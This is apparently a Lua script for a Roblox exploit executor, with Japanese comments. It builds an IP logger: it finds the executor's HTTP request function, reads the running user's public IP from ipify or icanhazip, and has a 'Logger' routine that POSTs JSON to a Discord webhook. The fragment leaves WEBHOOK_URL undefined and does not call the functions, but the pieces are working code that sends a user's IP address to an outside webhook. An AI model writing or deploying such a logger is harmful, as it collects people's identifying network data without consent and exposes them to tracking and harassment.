-- エクスキュータチェック（必須ではない）
if not syn and not getgenv then
    warn("このスクリプトはエクスキュータで実行してください")
end
-- HTTPリクエスト関数を取得
local function getRequestFunc()
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    if request then return request end
    return nil
end
-- Discordへ送信
local function sendToWebhook(data)
    local requestFunc = getRequestFunc()
    if not requestFunc then
        warn("[Logger] HTTPリクエスト関数が見つかりません")
        return false
    end
    
    local http = game:GetService("HttpService")
    local json = http:JSONEncode(data)
    
    local success, response = pcall(function()
        return requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end)
    
    if success and response and response.StatusCode == 204 then
        print("[Logger] Discord送信成功")
        return true
    else
        warn("[Logger] Discord送信失敗: " .. tostring(response and response.StatusCode or "不明"))
        return false
    end
end
-- IP取得
local function getIP()
    local requestFunc = getRequestFunc()
    if not requestFunc then return "IP取得不可" end
    
    local urls = {
        "https://api.ipify.org",
        "https://icanhazip.com"
    }
    
    for _, url in ipairs(urls) do
        local success, response = pcall(function()
            return requestFunc({ Url = url, Method = "GET" })
        end)
        if success and response and response.Body then
            local ip = response.Body:gsub("%s+", "")
            if ip:match("%d+%.%d+%.%d+%.%d+") then
                return ip
            end
        end
    end
    return "取得失敗"
end
